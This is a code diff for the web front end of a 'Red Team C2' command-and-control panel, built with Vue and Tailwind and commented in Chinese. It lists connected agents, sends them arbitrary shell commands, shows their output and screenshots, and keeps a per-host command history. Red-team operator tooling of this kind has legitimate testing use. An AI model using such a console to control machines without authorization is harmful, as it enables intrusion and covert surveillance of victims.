@@ -2,106 +2,168 @@
 <html lang="zh">
 <head>
     <meta charset="UTF-8">
-    <title>C2 Command & Control</title>
+    <title>RED TEAM C2 - Terminal</title>
+    <!-- Vue 3 -->
     <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        ::-webkit-scrollbar { width: 8px; }
+        /* 滚动条美化 */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
         ::-webkit-scrollbar-track { background: #1f2937; }
         ::-webkit-scrollbar-thumb { background: #4b5563; border-radius: 4px; }
         ::-webkit-scrollbar-thumb:hover { background: #6b7280; }
-        .fade-enter-active, .fade-leave-active { transition: opacity 0.5s; }
+        
+        .fade-enter-active, .fade-leave-active { transition: opacity 0.3s; }
         .fade-enter-from, .fade-leave-to { opacity: 0; }
-        /* 图片模态框样式 */
-        .modal-enter-active, .modal-leave-active { transition: opacity 0.3s; }
-        .modal-enter-from, .modal-leave-to { opacity: 0; }
+
+        /* 终端光标闪烁动画 */
+        .cursor-blink { animation: blink 1s step-end infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
     </style>
 </head>
-<body class="bg-gray-900 text-white font-mono h-screen flex flex-col overflow-hidden">
+<body class="bg-gray-950 text-gray-200 font-mono h-screen flex flex-col overflow-hidden">
     <div id="app" class="flex flex-col h-full container mx-auto p-4 max-w-7xl">
         
-        <!-- 头部 -->
-        <header class="mb-6 border-b border-gray-700 pb-4 flex justify-between items-center shrink-0">
-            <div class="flex items-center gap-2">
-                <div class="w-3 h-3 bg-red-500 rounded-full animate-pulse"></div>
-                <h1 class="text-2xl font-bold tracking-wider">RED TEAM <span class="text-red-500">C2</span> <span class="text-xs text-gray-500 ml-2">v2.0 (Media Enabled)</span></h1>
+        <!-- 顶部导航 -->
+        <header class="mb-6 border-b border-gray-800 pb-4 flex justify-between items-center shrink-0">
+            <div class="flex items-center gap-3">
+                <div class="w-3 h-3 bg-red-600 rounded-full animate-pulse shadow-[0_0_10px_red]"></div>
+                <h1 class="text-2xl font-bold tracking-widest text-white">C2 <span class="text-red-600">TERMINAL</span> <span class="text-xs text-gray-600 ml-2">v3.0</span></h1>
             </div>
-            <div class="flex gap-4 text-sm text-gray-400">
-                <span>在线: <span class="text-green-400 font-bold">{{ activeCount }}</span></span>
+            <div class="flex gap-4 text-sm text-gray-500">
+                <span>Total: {{ agents.length }}</span>
+                <span>Active: <span class="text-green-500 font-bold">{{ activeCount }}</span></span>
             </div>
         </header>
 
-        <!-- 主机列表 -->
-        <div class="flex-1 overflow-y-auto pr-2 pb-20">
-            <transition-group name="fade" tag="div" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-                
+        <!-- 主机卡片列表 -->
+        <div class="flex-1 overflow-y-auto pr-2 pb-10">
+            <div v-if="agents.length === 0" class="flex flex-col items-center justify-center h-64 text-gray-600">
+                <p class="animate-pulse">Waiting for beacons...</p>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-5">
                 <div v-for="agent in agents" :key="agent.id" 
-                     class="bg-gray-800 rounded-lg p-4 border relative group transition-all duration-300 flex flex-col"
-                     :class="agent.status === 'active' ? 'border-green-600 shadow-[0_0_15px_rgba(22,163,74,0.2)]' : 'border-gray-700 opacity-70 grayscale'">
+                     class="bg-gray-900 rounded-lg border relative group transition-all duration-300 hover:-translate-y-1"
+                     :class="agent.status === 'active' ? 'border-green-800/50 shadow-lg shadow-green-900/10' : 'border-gray-800 opacity-60'">
                     
-                    <button @click="deleteAgent(agent.id)" class="absolute top-2 right-2 text-gray-500 hover:text-red-500 hover:bg-gray-700 rounded-full p-1 transition-colors z-10">
-                        <svg class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" /></svg>
-                    </button>
-
-                    <div class="flex items-start gap-3 mb-3 border-b border-gray-700 pb-2">
-                        <div class="p-2 rounded bg-gray-700">
-                            <!-- 根据系统类型显示图标 (模拟) -->
-                            <svg class="h-6 w-6 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" /></svg>
+                    <!-- 卡片头部 -->
+                    <div class="p-4 border-b border-gray-800 flex justify-between items-start">
+                        <div class="flex gap-3">
+                            <div class="p-2 rounded bg-gray-800 h-fit">
+                                <svg class="h-6 w-6 text-blue-500" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" /></svg>
+                            </div>
+                            <div>
+                                <h2 class="text-lg font-bold text-gray-100 truncate w-40" :title="agent.hostname">{{ agent.hostname }}</h2>
+                                <p class="text-xs text-gray-500">{{ agent.ip }}</p>
+                            </div>
                         </div>
-                        <div class="overflow-hidden">
-                            <h2 class="text-lg font-bold truncate text-gray-100">{{ agent.hostname }}</h2>
-                            <p class="text-xs text-gray-500 font-mono">{{ agent.ip }}</p>
-                        </div>
-                    </div>
-
-                    <div class="flex justify-between items-center text-xs mb-3">
-                        <span class="flex items-center gap-1.5 px-2 py-0.5 rounded-full" :class="agent.status === 'active' ? 'bg-green-900/50 text-green-400' : 'bg-red-900/50 text-red-400'">
-                            <span class="w-1.5 h-1.5 rounded-full" :class="agent.status === 'active' ? 'bg-green-400' : 'bg-red-400'"></span>
+                        <span class="text-xs px-2 py-1 rounded-full border" 
+                              :class="agent.status === 'active' ? 'bg-green-900/20 border-green-800 text-green-400' : 'bg-red-900/20 border-red-800 text-red-400'">
                             {{ agent.status.toUpperCase() }}
                         </span>
-                        <span class="text-gray-500">{{ formatTime(agent.last_seen) }}</span>
                     </div>
 
-                    <!-- 回显区：支持图片 -->
-                    <div class="bg-black/80 rounded p-2 h-48 overflow-y-auto mb-3 font-mono text-xs border border-gray-700/50 relative">
-                        <div v-if="!agent.last_result" class="absolute inset-0 flex items-center justify-center text-gray-600 select-none">
-                            > 等待回显...
+                    <!-- 卡片操作区 -->
+                    <div class="p-4 bg-gray-900/50">
+                        <div class="flex justify-between items-center text-xs text-gray-500 mb-4">
+                            <span>Last Seen: {{ formatTime(agent.last_seen) }}</span>
+                            <span>ID: {{ agent.id.substring(0,8) }}...</span>
                         </div>
-                        
-                        <!-- 这里的逻辑判断是不是图片 -->
-                        <div v-else-if="agent.last_result.startsWith('[IMAGE]')">
-                            <p class="text-green-500 mb-1">> 接收到屏幕截图:</p>
-                            <img :src="'data:image/png;base64,' + agent.last_result.substring(7)" 
-                                 class="w-full rounded border border-gray-600 cursor-pointer hover:opacity-90 transition-opacity"
-                                 @click="showImage('data:image/png;base64,' + agent.last_result.substring(7))">
-                        </div>
-                        
-                        <pre v-else class="whitespace-pre-wrap text-green-400 leading-relaxed">{{ agent.last_result }}</pre>
-                    </div>
 
-                    <!-- 快捷指令栏 -->
-                    <div class="flex gap-2 mb-2">
-                        <button @click="quickCmd(agent.id, 'whoami')" class="flex-1 bg-gray-700 hover:bg-gray-600 text-xs py-1 rounded text-gray-300">Whoami</button>
-                        <button @click="quickCmd(agent.id, 'dir')" class="flex-1 bg-gray-700 hover:bg-gray-600 text-xs py-1 rounded text-gray-300">Dir</button>
-                        <button @click="quickCmd(agent.id, 'screenshot')" class="flex-1 bg-purple-900/50 hover:bg-purple-800 text-purple-300 text-xs py-1 rounded border border-purple-800">📷 截屏</button>
-                    </div>
-
-                    <div class="flex gap-2">
-                        <input type="text" v-model="commandInputs[agent.id]" @keyup.enter="sendCommand(agent.id)"
-                               placeholder="输入命令..." class="bg-gray-900 text-white text-sm px-3 py-2 rounded border border-gray-600 flex-1 focus:outline-none focus:border-blue-500">
-                        <button @click="sendCommand(agent.id)" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded text-sm font-medium">发送</button>
+                        <!-- 核心按钮：打开终端模态框 -->
+                        <button @click="openTerminal(agent)" 
+                                class="w-full bg-gray-800 hover:bg-gray-700 text-blue-400 border border-gray-700 py-3 rounded flex items-center justify-center gap-2 transition-colors group-hover:border-blue-900">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
+                            </svg>
+                            <span>进入终端 / 查看历史</span>
+                        </button>
+                        
+                        <button @click="deleteAgent(agent.id)" class="mt-2 w-full text-xs text-gray-600 hover:text-red-500 py-1">移除主机</button>
                     </div>
                 </div>
-            </transition-group>
+            </div>
         </div>
 
-        <!-- 图片预览模态框 -->
-        <transition name="modal">
-            <div v-if="previewImage" class="fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-4" @click="previewImage = null">
-                <img :src="previewImage" class="max-w-full max-h-full rounded shadow-2xl border border-gray-700">
-                <p class="absolute bottom-10 text-gray-400 text-sm">点击任意处关闭</p>
+        <!-- 全屏终端模态框 (History Modal) -->
+        <transition name="fade">
+            <div v-if="currentTerminalAgent" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+                <div class="bg-gray-900 w-full max-w-5xl h-[85vh] rounded-lg shadow-2xl border border-gray-700 flex flex-col overflow-hidden">
+                    
+                    <!-- 终端顶部栏 -->
+                    <div class="bg-gray-800 px-4 py-2 flex justify-between items-center border-b border-gray-700 shrink-0">
+                        <div class="flex items-center gap-2">
+                            <span class="w-3 h-3 rounded-full bg-red-500 cursor-pointer hover:bg-red-400" @click="closeTerminal"></span>
+                            <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
+                            <span class="w-3 h-3 rounded-full bg-green-500"></span>
+                            <span class="ml-4 text-sm font-bold text-gray-300">root@{{ currentTerminalAgent.hostname }}:~</span>
+                        </div>
+                        <button @click="closeTerminal" class="text-gray-400 hover:text-white">
+                            <svg class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" /></svg>
+                        </button>
+                    </div>
+
+                    <!-- 终端内容区 (历史记录滚动) -->
+                    <div id="terminal-content" class="flex-1 bg-black p-4 overflow-y-auto font-mono text-sm space-y-4">
+                        <!-- 欢迎语 -->
+                        <div class="text-gray-500 mb-4">
+                            Red Team C2 Console [Version 3.0]<br>
+                            Connected to session {{ currentTerminalAgent.id }}<br>
+                            Type 'help' for options.
+                        </div>
+
+                        <!-- 历史记录循环 -->
+                        <div v-for="(entry, index) in getAgentHistory(currentTerminalAgent.id)" :key="index" class="space-y-1">
+                            
+                            <!-- 1. 命令输入行 -->
+                            <div v-if="entry.type === 'cmd'" class="flex gap-2 text-white">
+                                <span class="text-green-500 font-bold">➜</span>
+                                <span class="text-blue-400">~</span>
+                                <span>{{ entry.content }}</span>
+                                <span class="text-gray-600 text-xs ml-auto">{{ formatTimeShort(entry.timestamp) }}</span>
+                            </div>
+
+                            <!-- 2. 结果回显行 -->
+                            <div v-if="entry.type === 'result'" class="pl-6 text-gray-300 whitespace-pre-wrap leading-relaxed border-l-2 border-gray-800 ml-1">
+                                <!-- 图片处理 -->
+                                <div v-if="entry.content.startsWith('[IMAGE]')">
+                                    <p class="text-green-500 text-xs mb-1">[Capture Received]</p>
+                                    <img :src="'data:image/png;base64,' + entry.content.substring(7)" 
+                                         class="max-w-2xl rounded border border-gray-700 cursor-pointer hover:opacity-90"
+                                         @click="previewImage = 'data:image/png;base64,' + entry.content.substring(7)">
+                                </div>
+                                <!-- 文本处理 -->
+                                <span v-else>{{ entry.content }}</span>
+                            </div>
+                        </div>
+                        
+                        <!-- 底部锚点 -->
+                        <div id="terminal-bottom"></div>
+                    </div>
+
+                    <!-- 底部输入框 -->
+                    <div class="bg-gray-800 p-3 flex gap-2 border-t border-gray-700 shrink-0">
+                        <span class="text-green-500 font-bold py-2 pl-2">➜</span>
+                        <input type="text" v-model="terminalInput" @keyup.enter="sendTerminalCommand" ref="cmdInput"
+                               placeholder="Enter command here..." 
+                               class="bg-transparent text-white w-full focus:outline-none font-mono py-2">
+                        <div class="flex gap-2">
+                            <button @click="sendTerminalCommand" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-1 rounded text-sm">Send</button>
+                            <!-- 快捷截图按钮 -->
+                            <button @click="terminalInput='screenshot'; sendTerminalCommand()" class="bg-purple-900/50 hover:bg-purple-700 border border-purple-600 text-purple-200 px-3 py-1 rounded text-sm">📷</button>
+                        </div>
+                    </div>
+                </div>
             </div>
         </transition>
+
+        <!-- 图片预览大图 -->
+        <div v-if="previewImage" class="fixed inset-0 bg-black/95 z-[60] flex items-center justify-center p-4 cursor-zoom-out" @click="previewImage = null">
+            <img :src="previewImage" class="max-w-full max-h-full rounded shadow-2xl border border-gray-600">
+        </div>
+
     </div>
 
     <script>
@@ -111,9 +173,14 @@
             data() {
                 return {
                     agents: [],
-                    commandInputs: {},
+                    // 核心：用来存储所有 Agent 的历史记录
+                    // 格式: { 'agent_id': [ {type:'cmd', content:'whoami'}, {type:'result', content:'admin'} ] }
+                    historyStorage: {}, 
+                    
+                    currentTerminalAgent: null, // 当前打开模态框的 Agent
+                    terminalInput: '',
+                    previewImage: null,
                     timer: null,
-                    previewImage: null // 用于存储当前全屏预览的图片
                 }
             },
             computed: {
@@ -124,34 +191,117 @@
                 this.timer = setInterval(this.fetchAgents, 1000)
             },
             methods: {
+                // 获取数据
                 async fetchAgents() {
                     try {
                         const res = await fetch('/api/admin/agents')
-                        this.agents = await res.json()
-                    } catch (e) {}
+                        const newData = await res.json()
+                        
+                        // 对比数据，更新历史记录
+                        newData.forEach(newAgent => {
+                            // 1. 初始化历史数组
+                            if (!this.historyStorage[newAgent.id]) {
+                                this.historyStorage[newAgent.id] = []
+                            }
+                            
+                            // 2. 检查是否有新结果
+                            // 我们需要对比内存中最后一条 result 和新来的 last_result
+                            const history = this.historyStorage[newAgent.id]
+                            const lastEntry = history.slice().reverse().find(e => e.type === 'result')
+                            
+                            // 只有当新结果不为空，且与上次记录不同时，才追加
+                            // (注意：这有个小缺陷，如果连续执行相同命令且结果完全一样，后端没变，前端就不会追加。
+                            //  完美方案是后端给结果加 ID，但在不改后端前提下，这是最优解)
+                            if (newAgent.last_result && (!lastEntry || lastEntry.content !== newAgent.last_result)) {
+                                history.push({
+                                    type: 'result',
+                                    content: newAgent.last_result,
+                                    timestamp: Date.now()
+                                })
+                                this.scrollToBottom()
+                            }
+                        })
+
+                        this.agents = newData
+                    } catch (e) {
+                        console.error("Connection lost")
+                    }
                 },
-                async sendCommand(id) {
-                    const cmd = this.commandInputs[id]
-                    if (!cmd) return
-                    await fetch('/api/admin/cmd', { method: 'POST', body: JSON.stringify({ id: id, cmd: cmd }) })
-                    this.commandInputs[id] = '' 
+
+                // 打开终端模态框
+                openTerminal(agent) {
+                    this.currentTerminalAgent = agent
+                    // 初始化历史
+                    if (!this.historyStorage[agent.id]) {
+                        this.historyStorage[agent.id] = []
+                    }
+                    this.scrollToBottom()
+                    // 自动聚焦输入框
+                    this.$nextTick(() => {
+                        if(this.$refs.cmdInput) this.$refs.cmdInput.focus()
+                    })
                 },
-                async quickCmd(id, cmd) {
-                    await fetch('/api/admin/cmd', { method: 'POST', body: JSON.stringify({ id: id, cmd: cmd }) })
+
+                // 关闭模态框
+                closeTerminal() {
+                    this.currentTerminalAgent = null
                 },
+
+                // 获取指定主机的历史
+                getAgentHistory(id) {
+                    return this.historyStorage[id] || []
+                },
+
+                // 发送命令逻辑
+                async sendTerminalCommand() {
+                    const cmd = this.terminalInput.trim()
+                    const agent = this.currentTerminalAgent
+                    
+                    if (!cmd || !agent) return
+
+                    // 1. 前端立即把命令上屏
+                    if (!this.historyStorage[agent.id]) this.historyStorage[agent.id] = []
+                    this.historyStorage[agent.id].push({
+                        type: 'cmd',
+                        content: cmd,
+                        timestamp: Date.now()
+                    })
+
+                    // 2. 发送给后端
+                    await fetch('/api/admin/cmd', {
+                        method: 'POST',
+                        body: JSON.stringify({ id: agent.id, cmd: cmd })
+                    })
+
+                    this.terminalInput = ''
+                    this.scrollToBottom()
+                },
+
                 async deleteAgent(id) {
-                    if(!confirm('确定删除?')) return;
-                    this.agents = this.agents.filter(a => a.id !== id);
+                    if(!confirm('Delete this host?')) return;
                     await fetch(`/api/admin/delete?id=${id}`)
+                    this.agents = this.agents.filter(a => a.id !== id)
+                    delete this.historyStorage[id] // 清除历史
                 },
-                showImage(src) {
-                    this.previewImage = src
+
+                // 辅助功能：滚动到底部
+                scrollToBottom() {
+                    this.$nextTick(() => {
+                        const container = document.getElementById('terminal-content')
+                        if (container) {
+                            container.scrollTop = container.scrollHeight
+                        }
+                    })
                 },
+
                 formatTime(timestamp) {
                     const diff = Math.floor(Date.now() / 1000) - timestamp
-                    if (diff < 60) return `${diff}秒前`
-                    if (diff < 3600) return `${Math.floor(diff/60)}分钟前`
+                    if (diff < 60) return `${diff}s ago`
+                    if (diff < 3600) return `${Math.floor(diff/60)}m ago`
                     return new Date(timestamp * 1000).toLocaleTimeString()
+                },
+                formatTimeShort(ms) {
+                    return new Date(ms).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'})
                 }
             }
         }).mount('#app')
